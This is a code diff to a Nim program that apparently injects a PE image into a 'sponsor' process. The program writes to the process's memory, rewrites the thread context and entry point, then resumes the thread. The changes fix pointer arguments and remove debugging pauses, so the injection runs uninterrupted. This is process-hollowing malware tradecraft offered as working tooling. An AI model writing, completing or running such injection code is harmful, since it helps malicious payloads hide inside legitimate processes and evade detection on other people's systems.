@@ -121,8 +121,8 @@ proc writeMemoryProcess(
 
 proc setThreadProcess(
     threadHandle: Handle,
-    peImageImageBase: ptr PVOID,
-    peImageEntryPoint: ptr PVOID
+    peImageImageBase: PVOID,
+    peImageEntryPoint: PVOID
 ) =
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
@@ -177,8 +177,6 @@ proc nimlineSplitted*(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImage
     if res != 0:
         when not defined(release): echo "[-] Could not write to sponsor process"
         quit(1)
-    
-    discard execShellCmd("pause")
 
     # Change sponsor thread Entrypoint
     when not defined(release): echo "[*] Changing thread context"
@@ -188,8 +186,6 @@ proc nimlineSplitted*(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImage
     if res != 0:
         when not defined(release): echo "[-] Could not change thread context"
         quit(1)
-    
-    discard execShellCmd("pause")
 
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
@@ -264,8 +260,8 @@ proc main() =
         elif i.startsWith("-T:"):
             setThreadProcess(
                 parseInt(i.replace("-T:", "")),
-                addr peImageImageBase,
-                addr peImageEntryPoint
+                peImageImageBase,
+                peImageEntryPoint
             )
         elif i.startsWith("-R:"):
             resumeThreadProcess(
